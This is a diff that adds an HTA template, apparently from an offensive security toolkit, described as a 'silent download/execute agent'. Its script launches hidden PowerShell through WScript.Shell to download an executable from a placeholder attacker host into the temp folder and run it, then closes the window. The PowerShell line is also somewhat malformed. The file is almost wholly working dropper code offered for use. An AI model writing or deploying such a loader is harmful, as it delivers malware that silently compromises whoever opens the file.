@@ -1,0 +1,14 @@
+<!--
+HTA template | Author: r00t-3xp10it (SSA)
+Silent download/execute agent (exe)
+using apache2 + hta + powershell .
+-->
+
+<script>
+a=new ActiveXObject('WScript.Shell');
+a.run('powershell.exe -w hidden -nop -c "iex(New-Object Net.WebClient).Downloadfile(\'http://LhOsT/NaMe\'), \'%temp%\\NaMe\') & start %temp%\\NaMe"', 0, true);
+window.close();
+</script>
+
+
+
